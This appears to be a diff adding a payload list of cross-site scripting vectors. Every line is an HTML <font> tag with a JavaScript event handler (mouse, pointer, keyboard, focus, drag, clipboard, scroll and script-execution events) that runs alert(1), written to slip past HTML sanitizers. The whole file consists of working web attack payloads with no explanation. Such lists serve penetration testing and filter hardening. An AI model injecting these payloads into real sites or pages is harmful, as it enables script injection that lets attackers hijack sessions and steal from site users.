@@ -1,0 +1,38 @@
+<font contenteditable onbeforeinput=alert(1)>test
+<font draggable="true" ondrag="alert(1)" style=display:block>test</font>
+<font draggable="true" ondragend="alert(1)" style=display:block>test</font>
+<font draggable="true" ondragenter="alert(1)" style=display:block>test</font>
+<font draggable="true" ondragleave="alert(1)" style=display:block>test</font>
+<font draggable="true" ondragstart="alert(1)" style=display:block>test</font>
+<font id=x style="transition:outline 1s" ontransitionend=alert(1) tabindex=1></font>
+<font id=x tabindex=1 onfocus=alert(1)></font>
+<font id=x tabindex=1 onfocusin=alert(1)></font>
+<font onafterscriptexecute=alert(1)><script>1</script>
+<font onbeforescriptexecute=alert(1)><script>1</script>
+<font onblur=alert(1) id=x tabindex=1 style=display:block>test</font><input value=clickme>
+<font onclick="alert(1)" style=display:block>test</font>
+<font oncontextmenu="alert(1)" style=display:block>test</font>
+<font oncopy=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
+<font oncut=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
+<font ondblclick="alert(1)" autofocus tabindex=1 style=display:block>test</font>
+<font onfocusout=alert(1) autofocus tabindex=1 style=display:block>test</font><input value=clickme>
+<font onkeydown="alert(1)" contenteditable style=display:block>test</font>
+<font onkeypress="alert(1)" contenteditable style=display:block>test</font>
+<font onkeyup="alert(1)" contenteditable style=display:block>test</font>
+<font onmousedown="alert(1)" style=display:block>test</font>
+<font onmouseenter="alert(1)" style=display:block>test</font>
+<font onmouseleave="alert(1)" style=display:block>test</font>
+<font onmousemove="alert(1)" style=display:block>test</font>
+<font onmouseout="alert(1)" style=display:block>test</font>
+<font onmouseover="alert(1)" style=display:block>test</font>
+<font onmouseup="alert(1)" style=display:block>test</font>
+<font onmousewheel=alert(1) style=display:block>requires scrolling
+<font onpointerdown=alert(1) style=display:block>XSS</font>
+<font onpointerenter=alert(1) style=display:block>XSS</font>
+<font onpointerleave=alert(1) style=display:block>XSS</font>
+<font onpointermove=alert(1) style=display:block>XSS</font>
+<font onpointerout=alert(1) style=display:block>XSS</font>
+<font onpointerover=alert(1) style=display:block>XSS</font>
+<font onpointerrawupdate=alert(1) style=display:block>XSS</font>
+<font onpointerup=alert(1) style=display:block>XSS</font>
+<font onscrollend=alert(1) style="display:block;overflow:auto;border:1px dashed;width:500px;height:100px;"><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>test</span></font>
